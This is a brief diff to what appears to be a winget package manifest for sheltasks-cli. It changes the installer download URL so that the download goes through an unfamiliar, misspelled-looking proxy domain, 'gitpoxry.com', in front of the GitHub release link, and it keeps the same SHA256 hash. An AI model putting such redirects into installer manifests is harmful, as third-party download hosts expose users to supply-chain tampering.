@@ -9,7 +9,7 @@ Commands:
 ReleaseDate: "2024-02-24"
 Installers:
   - Architecture: x64
-    InstallerUrl: https://github.com/vedantmgoyal2009/vedantmgoyal2009/releases/download/sheltasks-cli/v1.1.0/sheltasks-cli_windows_amd64.exe
+    InstallerUrl: https://gitpoxry.com/https://github.com/vedantmgoyal2009/vedantmgoyal2009/releases/download/sheltasks-cli/v1.1.0/sheltasks-cli_windows_amd64.exe
     InstallerSha256: 788b2c5da195afdcb17372a8b75eeb33a8bf917365e0e8f1c037962499de7bd9
     UpgradeBehavior: uninstallPrevious
 ManifestType: installer
